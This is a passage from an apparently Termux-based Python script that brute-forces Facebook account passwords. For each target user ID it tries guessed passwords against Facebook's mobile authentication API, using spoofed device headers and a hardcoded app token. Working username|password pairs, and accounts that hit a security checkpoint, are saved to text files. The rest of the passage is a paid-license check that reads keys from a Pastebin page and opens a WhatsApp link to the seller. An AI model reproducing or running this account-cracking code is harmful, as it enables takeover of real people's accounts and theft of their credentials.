			"\r [RB RAHUL] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": rua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[ RAHUL-OK ] %s | %s\033[0;97m         "%(uid, pw))
				print ("\r \033[0;92m Congrats Bro ")
				self.ok.append("%s|%s"%(uid, pw))
				open("2009-RAHUL-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;92m[ RAHUL-OK ] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("2009-RAHUL-OK.txt","a").write(" %s | %s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1


def Subscraption():
	key1=open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
	clear()
	print(logo)
	r1=requests.get("https://pastebin.com/p3jbWM14").text
	if key1 in r1:
		os.system('clear')
		print(logo)
		Main()
	else:
		os.system("clear")
		print(logo)
		print("\t \033[1;32m First Get Approvel\033[1;37m ")
		time.sleep(1)
		os.system("clear")
		print(logo)
		print ("")
		print(" \033[1;32m AHAD Toll Paid You Need Get Approved First\033[1;37m\n")
		print(" \033[1;32m Note : Paid Tolls Free  HA JANI LOG \033[1;37m")
		print ("")
		print(" Your Key is Not Approved ")
		print("")
		print(" Copy And Send Key To Admin")
		print ("")
		print (" Your Key : "+ak+ahsan+key1)
		print ("")
		name = input(" Your Name : ")
		print ("")
		input(" Press Enter To Send Key")
		time.sleep(3.5)
		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
		os.system('am start https://wa.me/+923407275127?text=' + tks)
		Subscraption()        
Main()
